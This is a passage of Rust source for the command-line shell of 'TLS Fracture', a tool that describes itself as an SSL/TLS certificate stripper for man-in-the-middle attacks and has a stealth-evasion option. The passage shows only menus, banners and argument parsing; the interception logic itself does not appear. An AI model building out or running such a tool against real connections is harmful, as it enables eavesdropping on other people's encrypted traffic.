    println!("{}", "═══════════════════════════════════════════════════════════════".bright_cyan());
    println!("{}  {}", "  Command".bright_yellow().bold(), "Description".bright_yellow().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════".bright_cyan());
    println!("  {}      Display this help message", "help".bright_green());
    println!("  {}     Start the TLS interception proxy", "start".bright_green());
    println!("  {}     Display current proxy status", "status".bright_green());
    println!("  {}      Show system information", "info".bright_green());
    println!("  {}     Clear the terminal screen", "clear".bright_green());
    println!("  {}      Exit the application", "exit".bright_green());
    println!("{}", "═══════════════════════════════════════════════════════════════".bright_cyan());
    println!();
}

/// Interactive prompt mode
async fn interactive_mode(
    bind_address: SocketAddr,
    target_hostname: String,
    target_port: u16,
    stealth_enabled: bool,
) -> Result<()> {
    display_banner().await;
    
    println!("{}", "Type 'help' for available commands or 'start' to begin proxy operation".bright_white().dimmed());
    println!();
    
    loop {
        print!("{}", ">> ".bright_cyan().bold());
        io::stdout().flush()?;
        
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let command = input.trim().to_lowercase();
        
        match command.as_str() {
            "help" => {
                display_help();
            }
            "start" => {
                println!("{}", "🚀 Starting TLS Fracture Proxy...".bright_green().bold());
                println!();
                println!("{}  {}", "  Bind Address:".bright_blue(), bind_address.to_string().white());
                println!("{}  {}:{}", "  Target:".bright_blue(), target_hostname.white(), target_port.to_string().white());
                println!("{}  {}", "  Stealth Mode:".bright_blue(), 
                    if stealth_enabled { "Enabled".green() } else { "Disabled".red() });
                println!();
                
                // Create and start proxy
                let proxy = TlsFractureProxy::new(
                    bind_address,
                    target_hostname.clone(),
                    target_port,
                    stealth_enabled,
                ).await?;
                
                println!("{}", "✓ Proxy started successfully!".green().bold());
                println!("{}", "  Listening for connections...".dimmed());
                println!("{}", "  Press Ctrl+C to stop".dimmed());
                println!();
                
                // Start proxy (this will block until Ctrl+C)
                if let Err(e) = proxy.start().await {
                    println!("{} {}", "✗ Proxy error:".red().bold(), e);
                }
                
                // If we get here, proxy stopped
                println!();
                println!("{}", "Proxy stopped.".yellow());
                break;
            }
            "status" => {
                println!();
                println!("{}  {}", "Status:".bright_magenta().bold(), "Stopped".red().bold());
                println!("{}  Use 'start' to begin proxy operation", "  ".dimmed());
                println!();
            }
            "info" => {
                println!();
                println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
                println!("{}  System Information", "  ".bright_cyan());
                println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
                println!("  {}  {}", "OS:".bright_blue(), std::env::consts::OS.white());
                println!("  {}  {}", "Architecture:".bright_blue(), std::env::consts::ARCH.white());
                println!("  {}  {}", "Version:".bright_blue(), "9.20.2091-proAlpha".white());
                println!("  {}  {}", "OpenSSL:".bright_blue(), "Enabled".green());
                println!("  {}  {}", "Bind Address:".bright_blue(), bind_address.to_string().white());
                println!("  {}  {}:{}", "Target:".bright_blue(), target_hostname.white(), target_port.to_string().white());
                println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
                println!();
            }
            "clear" => {
                print!("\x1B[2J\x1B[1;1H");
                io::stdout().flush()?;
            }
            "exit" | "quit" => {
                println!();
                println!("{}", "👋 Shutting down TLS Fracture...".bright_yellow());
                sleep(Duration::from_millis(500)).await;
                println!("{}", "✓ Goodbye!".green().bold());
                println!();
                break;
            }
            "" => {
                // Empty input, just show prompt again
            }
            _ => {
                println!("{} '{}'", "✗ Unknown command:".red(), command.white());
                println!("  Type {} for available commands", "help".bright_green());
            }
        }
    }
    
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize tracing subscriber for logging
    tracing_subscriber::fmt::init();
    
    // Parse command line arguments
    let args = clap::Command::new("TLS Fracture")
        .version("9.20.2091-proAlpha")
        .author("Khaninkali | HyperSecurity")
        .about("Advanced SSL/TLS Certificate Stripper for MITM Attacks")
        .arg(
            clap::Arg::new("bind")
                .short('b')
                .long("bind")
                .value_name("ADDRESS")
                .help("Local address to bind the proxy server")
                .default_value("127.0.0.1:8080")
        )
        .arg(
            clap::Arg::new("target")
                .short('t')
                .long("target")
                .value_name("HOSTNAME")
                .help("Target server hostname to proxy to")
                .required(false)
        )
        .arg(
            clap::Arg::new("port")
                .short('p')
                .long("port")
                .value_name("PORT")
                .help("Target server port")
                .value_parser(clap::value_parser!(u16))
                .default_value("443")
        )
        .arg(
            clap::Arg::new("stealth")
                .short('s')
                .long("stealth")
                .help("Enable stealth evasion techniques")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            clap::Arg::new("interactive")
                .short('i')
                .long("interactive")
                .help("Start in interactive mode with command prompt")
                .action(clap::ArgAction::SetTrue)
        )
        .get_matches();
    
    let bind_address: SocketAddr = args.get_one("bind")
        .unwrap_or(&"127.0.0.1:8080".to_string())
        .parse()?;
    let target_hostname = args.get_one::<String>("target")
        .map(|s| s.clone())
        .unwrap_or_else(|| "example.com".to_string());
    let target_port = *args.get_one::<u16>("port").unwrap_or(&443);
    let stealth_enabled = args.get_flag("stealth");
    let interactive = args.get_flag("interactive");
    
    // Check if interactive mode or direct start
    if interactive || args.get_one::<String>("target").is_none() {
        // Interactive mode with banner and prompt
        interactive_mode(bind_address, target_hostname, target_port, stealth_enabled).await?;
    } else {
        // Direct start mode (original behavior) - show quick banner
        println!();
        println!("{}", "╔══════════════════════════════════════════════════════════════════════╗".bright_cyan().bold());
        println!("{}  {}  {}", 
            "║".bright_cyan().bold(),
            "🔓 TLS FRACTURE".bright_white().bold(),
            format!("v{}", "9.20.2091-proAlpha").bright_yellow().bold()
        );
        println!("{}", "╚══════════════════════════════════════════════════════════════════════╝".bright_cyan().bold());
        println!();
        
        println!("{}  {}", "Bind Address:".bright_blue(), bind_address.to_string().white());
        println!("{}  {}:{}", "Target:".bright_blue(), target_hostname.white(), target_port.to_string().white());
        println!("{}  {}", "Stealth Mode:".bright_blue(), 
            if stealth_enabled { "Enabled".green() } else { "Disabled".red() });
        println!();
        
        info!("TLS Fracture Proxy v9.20.2091-proAlpha starting...");
        info!("Bind address: {}", bind_address);
        info!("Target: {}:{}", target_hostname, target_port);
        info!("Stealth mode: {}", stealth_enabled);
        
        // Create and start the TLS fracture proxy
        let proxy = TlsFractureProxy::new(
            bind_address,
            target_hostname,
            target_port,
            stealth_enabled,
        ).await?;
        
        println!("{}", "✓ Proxy started - listening for connections...".green().bold());
        println!();
        
        proxy.start().await?;
    }
    
    Ok(())
}

// Production SSL/TLS stripping implementation - no test code
